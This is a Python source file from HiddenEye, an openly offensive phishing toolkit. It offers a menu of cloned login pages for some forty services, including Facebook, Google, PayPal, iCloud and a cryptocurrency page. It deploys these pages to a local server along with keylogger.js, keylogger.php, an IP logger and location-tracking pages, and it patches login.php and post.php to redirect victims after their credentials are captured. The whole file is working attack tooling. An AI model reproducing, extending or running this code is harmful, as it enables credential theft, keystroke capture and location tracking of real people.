#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import time

import Defs.ActionManager.simple_informant as simple_informant
import Defs.LocalizationManager.lang_action_manager.lang_main_runner as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
from Defs.ImportManager.unsorted_will_be_replaced import copyfile
from Defs.ImportManager.unsorted_will_be_replaced import mkdir
from Defs.ImportManager.unsorted_will_be_replaced import path
from Defs.ImportManager.unsorted_will_be_replaced import pathlib_Path
from Defs.ImportManager.unsorted_will_be_replaced import remove
from Defs.ImportManager.unsorted_will_be_replaced import rmtree
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import wait
from Defs.ImportManager.unsorted_will_be_replaced import webpage_set
from Defs.LocalizationManager.helper import print_sorted_as_menu

module_loading_message = simple_informant.module_loading_message


def start_main_menu():
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(localization.lang_start_main_menu["version_by_darksec"])
    print(localization.lang_start_main_menu["short_description"])
    print(localization.lang_start_main_menu["features_summary"])
    print(localization.lang_start_main_menu["down_line"])
    print(localization.lang_start_main_menu["attack_vector_message"])
    print(localization.lang_start_main_menu["phishing_modules_header"])
    print_sorted_as_menu(
        localization.lang_start_main_menu["phishing_modules_list"])
    print(localization.lang_start_main_menu["additional_modules"])
    print_sorted_as_menu(
        localization.lang_start_main_menu["additional_modules_list"])

    option = input(global_localization.input_line)
    option = option.zfill(2)
    if option == "01":
        module_loading_message("Facebook")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["facebook_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("Facebook", custom_option)
    elif option == "02":
        module_loading_message("Google")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["google_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("Google", custom_option)
    elif option == "03":
        module_loading_message("LinkedIn")
        custom_option = ""
        start_phishing_page("LinkedIn", custom_option)
    elif option == "04":
        module_loading_message("GitHub")
        custom_option = ""
        start_phishing_page("GitHub", custom_option)
    elif option == "05":
        module_loading_message("StackOverflow")
        custom_option = ""
        start_phishing_page("StackOverflow", custom_option)
    elif option == "06":
        module_loading_message("WordPress")
        custom_option = ""
        start_phishing_page("WordPress", custom_option)
    elif option == "07":
        module_loading_message("Twitter")
        custom_option = ""
        start_phishing_page("Twitter", custom_option)
    elif option == "08":
        module_loading_message("Instagram")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["instagram_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("Instagram", custom_option)
    elif option == "09":
        module_loading_message("Snapchat")
        custom_option = ""
        start_phishing_page("Snapchat", custom_option)
    elif option == "10":
        module_loading_message("Yahoo")
        custom_option = ""
        start_phishing_page("Yahoo", custom_option)
    elif option == "11":
        module_loading_message("Twitch")
        custom_option = ""
        start_phishing_page("Twitch", custom_option)
    elif option == "12":
        module_loading_message("Microsoft")
        custom_option = ""
        start_phishing_page("Microsoft", custom_option)
    elif option == "13":
        module_loading_message("Steam")
        custom_option = ""
        start_phishing_page("Steam", custom_option)
    elif option == "14":
        module_loading_message("VK")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["VK_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("VK", custom_option)
    elif option == "15":
        module_loading_message("iCloud")
        custom_option = ""
        start_phishing_page("iCloud", custom_option)
    elif option == "16":
        module_loading_message("GitLab")
        custom_option = ""
        start_phishing_page("GitLab", custom_option)
    elif option == "17":
        module_loading_message("NetFlix")
        custom_option = ""
        start_phishing_page("NetFlix", custom_option)
    elif option == "18":
        module_loading_message("Origin")
        custom_option = ""
        start_phishing_page("Origin", custom_option)
    elif option == "19":
        module_loading_message("Pinterest")
        custom_option = ""
        start_phishing_page("Pinterest", custom_option)
    elif option == "20":
        module_loading_message("ProtonMail")
        custom_option = ""
        start_phishing_page("ProtonMail", custom_option)
    elif option == "21":
        module_loading_message("Spotify")
        custom_option = ""
        start_phishing_page("Spotify", custom_option)
    elif option == "22":
        module_loading_message("Quora")
        custom_option = ""
        start_phishing_page("Quora", custom_option)
    elif option == "23":
        module_loading_message("PornHub")
        custom_option = ""
        start_phishing_page("PornHub", custom_option)
    elif option == "24":
        module_loading_message("Adobe")
        custom_option = ""
        start_phishing_page("Adobe", custom_option)
    elif option == "25":
        module_loading_message("Badoo")
        custom_option = ""
        start_phishing_page("Badoo", custom_option)
    elif option == "26":
        module_loading_message("CryptoCurrency")
        custom_option = ""
        start_phishing_page("CryptoCurrency", custom_option)
    elif option == "27":
        module_loading_message("DevianArt")
        custom_option = ""
        start_phishing_page("DevianArt", custom_option)
    elif option == "28":
        module_loading_message("DropBox")
        custom_option = ""
        start_phishing_page("DropBox", custom_option)
    elif option == "29":
        module_loading_message("eBay")
        custom_option = ""
        start_phishing_page("eBay", custom_option)
    elif option == "30":
        module_loading_message("MySpace")
        custom_option = ""
        start_phishing_page("Myspace", custom_option)
    elif option == "31":
        module_loading_message("PayPal")
        custom_option = ""
        start_phishing_page("PayPal", custom_option)
    elif option == "32":
        module_loading_message("Shopify")
        custom_option = ""
        start_phishing_page("Shopify", custom_option)
    elif option == "33":
        module_loading_message("Verizon")
        custom_option = ""
        start_phishing_page("Verizon", custom_option)
    elif option == "34":
        module_loading_message("Yandex")
        custom_option = ""
        start_phishing_page("Yandex", custom_option)
    elif option == "35":
        module_loading_message("Reddit")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.lang_start_main_menu["reddit_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("Reddit", custom_option)
    elif option == "36":
        module_loading_message("Subitoit")
        custom_option = ""
        start_phishing_page("Subitoit", custom_option)
    elif option == "37":
        module_loading_message("PlayStation")
        custom_option = ""
        start_phishing_page("PlayStation", custom_option)
    elif option == "38":
        module_loading_message("Xbox")
        custom_option = ""
        start_phishing_page("Xbox", custom_option)
    elif option == "39":
        module_loading_message("CUSTOM(1)")
        custom_option = ""
        start_phishing_page("CUSTOM(1)", custom_option)
    elif option == "40":
        module_loading_message("CUSTOM(2)")
        custom_option = ""
        start_phishing_page("CUSTOM(2)", custom_option)
        """PHISHING MODULES BELOW"""

    elif option == "0A":
        module_loading_message("LOCATION")
        print(localization.lang_start_main_menu["operation_mode"])
        print_sorted_as_menu(
            localization.
            lang_start_main_menu["additional_module_location_operation_modes"])
        custom_option = input(global_localization.input_line)
        start_phishing_page("LOCATION", custom_option)
    else:
        start_main_menu()


def start_phishing_page(page, custom_option):  # Phishing pages selection menu
    run_command(["chmod", "-R", "777", "Server"])
    rmtree("Server/www", onerror=simple_informant.remove_readonly)
    mkdir("Server/www")
    pathlib_Path("Server/www/usernames.txt").touch()
    pathlib_Path("Server/www/ip.txt").touch()
    copyfile("WebPages/ip.php", "Server/www/ip.php")
    copyfile("WebPages/KeyloggerData.txt", "Server/www/KeyloggerData.txt")
    copyfile("WebPages/keylogger.js", "Server/www/keylogger.js")
    copyfile("WebPages/keylogger.php", "Server/www/keylogger.php")
    try:
        remove("link.url")
    except FileNotFoundError:
        pass

    if custom_option == "1" and page == "Facebook":
        webpage_set("WebPages/fb_standard/", "Server/www/")
    elif custom_option == "2" and page == "Facebook":
        webpage_set("WebPages/fb_advanced_poll/", "Server/www/")
    elif custom_option == "3" and page == "Facebook":
        webpage_set("WebPages/fb_security_fake/", "Server/www/")
    elif custom_option == "4" and page == "Facebook":
        webpage_set("WebPages/fb_messenger/", "Server/www/")
    elif custom_option == "1" and page == "Google":
        webpage_set("WebPages/google_standard/", "Server/www/")
    elif custom_option == "2" and page == "Google":
        webpage_set("WebPages/google_advanced_poll/", "Server/www/")
    elif custom_option == "3" and page == "Google":
        webpage_set("WebPages/google_advanced_web/", "Server/www/")
    elif page == "LinkedIn":
        webpage_set("WebPages/linkedin/", "Server/www/")
    elif page == "GitHub":
        webpage_set("WebPages/GitHub/", "Server/www/")
    elif page == "StackOverflow":
        webpage_set("WebPages/stackoverflow/", "Server/www/")
    elif page == "WordPress":
        webpage_set("WebPages/wordpress/", "Server/www/")
    elif page == "Twitter":
        webpage_set("WebPages/twitter/", "Server/www/")
    elif page == "Snapchat":
        webpage_set("WebPages/Snapchat_web/", "Server/www/")
    elif page == "Yahoo":
        webpage_set("WebPages/yahoo_web/", "Server/www/")
    elif page == "Twitch":
        webpage_set("WebPages/twitch/", "Server/www/")
    elif page == "Microsoft":
        webpage_set("WebPages/live_web/", "Server/www/")
    elif page == "Steam":
        webpage_set("WebPages/steam/", "Server/www/")
    elif page == "iCloud":
        webpage_set("WebPages/iCloud/", "Server/www/")
    elif custom_option == "1" and page == "Instagram":
        webpage_set("WebPages/Instagram_web/", "Server/www/")
    elif custom_option == "2" and page == "Instagram":
        webpage_set("WebPages/Instagram_autoliker/", "Server/www/")
    elif custom_option == "3" and page == "Instagram":
        webpage_set("WebPages/Instagram_advanced_attack/", "Server/www/")
    elif custom_option == "4" and page == "Instagram":
        webpage_set("WebPages/Instagram_VerifiedBadge/", "Server/www/")
    elif custom_option == "5" and page == "Instagram":
        webpage_set("WebPages/instafollowers/", "Server/www/")
    elif custom_option == "1" and page == "VK":
        webpage_set("WebPages/VK/", "Server/www/")
    elif custom_option == "2" and page == "VK":
        webpage_set("WebPages/VK_poll_method/", "Server/www/")
    elif page == "GitLab":
        webpage_set("WebPages/gitlab/", "Server/www/")
    elif page == "NetFlix":
        webpage_set("WebPages/netflix/", "Server/www/")
    elif page == "Origin":
        webpage_set("WebPages/origin/", "Server/www/")
    elif page == "Pinterest":
        webpage_set("WebPages/pinterest/", "Server/www/")
    elif page == "ProtonMail":
        webpage_set("WebPages/protonmail/", "Server/www/")
    elif page == "Spotify":
        webpage_set("WebPages/spotify/", "Server/www/")
    elif page == "Quora":
        webpage_set("WebPages/quora/", "Server/www/")
    elif page == "PornHub":
        webpage_set("WebPages/pornhub/", "Server/www/")
    elif page == "Adobe":
        webpage_set("WebPages/adobe/", "Server/www/")
    elif page == "Badoo":
        webpage_set("WebPages/badoo/", "Server/www/")
    elif page == "CryptoCurrency":
        webpage_set("WebPages/cryptocurrency/", "Server/www/")
    elif page == "DevianArt":
        webpage_set("WebPages/devianart/", "Server/www/")
    elif page == "DropBox":
        webpage_set("WebPages/dropbox/", "Server/www/")
    elif page == "eBay":
        webpage_set("WebPages/ebay/", "Server/www/")
    elif page == "Myspace":
        webpage_set("WebPages/myspace/", "Server/www/")
    elif page == "PayPal":
        webpage_set("WebPages/paypal/", "Server/www/")
    elif page == "Shopify":
        webpage_set("WebPages/shopify/", "Server/www/")
    elif page == "Verizon":
        webpage_set("WebPages/verizon/", "Server/www/")
    elif page == "Yandex":
        webpage_set("WebPages/yandex/", "Server/www/")
    elif custom_option == "1" and page == "Reddit":
        webpage_set("WebPages/Reddit/", "Server/www/")
    elif custom_option == "2" and page == "Reddit":
        webpage_set("WebPages/Reddit-old/", "Server/www/")
    elif page == "Subitoit":
        webpage_set("WebPages/subitoit/", "Server/www/")
    elif page == "PlayStation":
        webpage_set("WebPages/playstation/", "Server/www/")
    elif page == "Xbox":
        webpage_set("WebPages/xbox/", "Server/www/")
    elif page == "CUSTOM(1)":
        print(localization.lang_start_phishing_page["custom_folder_directory"].
              format(page=page))
        print(
            localization.lang_start_phishing_page["manual_reading_suggestion"].
            format(page=page))
        input(localization.lang_start_phishing_page[
            "press_enter_to_continue_if_setup_correctly"])
        print(localization.lang_start_phishing_page["copying_your_files"])
        wait(3)
        webpage_set("WebPages/CUSTOM(1)/", "Server/www/")
    elif page == "CUSTOM(2)":
        print(localization.lang_start_phishing_page["custom_folder_directory"].
              format(page=page))
        print(
            localization.lang_start_phishing_page["manual_reading_suggestion"].
            format(page=page))
        input(localization.lang_start_phishing_page[
            "press_enter_to_continue_if_setup_correctly"])
        print(localization.lang_start_phishing_page["copying_your_files"])
        wait(3)
        webpage_set("WebPages/CUSTOM(2)/", "Server/www/")

    # Tools Below && Phishing Pages Above
    elif custom_option == "1" and page == "LOCATION":
        wait(3)
        webpage_set("WebPages/TOOLS/nearyou", "Server/www/")
        print(localization.lang_start_phishing_page["https_suggestion"])
        input(localization.lang_start_phishing_page[
            "press_enter_to_continue_if_setup_correctly"])
    elif custom_option == "2" and page == "LOCATION":
        wait(3)
        webpage_set("WebPages/TOOLS/gdrive", "Server/www/")
        print(localization.lang_start_phishing_page["https_suggestion"])
        print(localization.lang_start_phishing_page["gdrive_suggestion"])
        input(localization.lang_start_phishing_page[
            "press_enter_to_continue_if_setup_correctly"])

    else:
        run_command("clear")
        print("Please choose a valid option")
        time.sleep(1)
        start_main_menu()


def enter_custom_redirecting_url(
):  # Question where user can input custom web-link
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(localization.
          lang_enter_custom_redirecting_url["enter_redirecting_url_header"])
    print(localization.
          lang_enter_custom_redirecting_url["enter_redirecting_url_prompt"])
    custom = input(
        localization.lang_enter_custom_redirecting_url["redirect_here"])
    if "http://" in custom or "https://" in custom:
        pass
    else:
        custom = "http://" + custom

    # For Location (gdrive) Template Redirection.
    if path.exists("Server/www/js/location.js"):
        with open("Server/www/js/location.js") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/js/location.js", "w")
        f.write(c)
        f.close()

    if path.exists("Server/www/post.php") and path.exists(
            "Server/www/login.php"):
        with open("Server/www/login.php") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/login.php", "w")
        f.write(c)
        f.close()

        with open("Server/www/post.php") as f:
            read_data = f.read()
        c = read_data.replace("<CUSTOM>", custom)
        f = open("Server/www/post.php", "w")
        f.write(c)
        f.close()

    else:
        try:
            with open("Server/www/login.php") as f:
                read_data = f.read()
            c = read_data.replace("<CUSTOM>", custom)
            f = open("Server/www/login.php", "w")
            f.write(c)
            f.close()
        except FileNotFoundError:
            run_command("clear")
            print(global_localization.hidden_eye_logo)
            print(global_localization.official_website_link)
            print(global_localization.by_darksec)
            print(
                "[^] ERROR: Please make sure your folder contains a valid login.php file."
            )
            exit()
